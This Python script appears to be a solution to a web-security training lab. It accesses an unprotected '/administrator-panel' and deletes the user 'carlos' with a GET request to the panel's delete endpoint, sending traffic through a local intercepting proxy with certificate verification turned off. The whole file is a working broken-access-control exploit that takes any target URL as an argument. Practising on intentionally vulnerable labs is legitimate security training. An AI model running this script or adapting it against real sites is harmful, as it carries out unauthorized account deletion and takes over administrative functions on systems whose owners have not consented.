import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https':  'http://127.0.0.1:8080'}

def delete_user(url):
    admin_path = "/administrator-panel"
    delete_user_carlos_path = "/administrator-panel/delete?username=carlos"

    res = requests.get(url + admin_path, verify=False, proxies=proxies)

    if res.status_code == 200:
        print("[+] Found the administrator panel!")
        print("[+] Deleting 'carlos' user..")

        # Deleting carlos user
        res = requests.get(url+delete_user_carlos_path, verify=False, proxies=proxies)

        if res.status_code == 200:
            print("[+] User 'carlos' deleted successfully...")
        else:
            print("[-] Could not delete user carlos")
    else:
        print("[-] Administrator panel not found.")
        print("[-] Existing the script...")


def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: python {sys.argv[0]} <url>")
        print(f"[+] Example: python {sys.argv[0]} https://example.com")
        sys.exit(-1)

    url = sys.argv[1].strip()
    print("[+] Finding admin panel...")
    delete_user(url)


if __name__ == "__main__":
    main()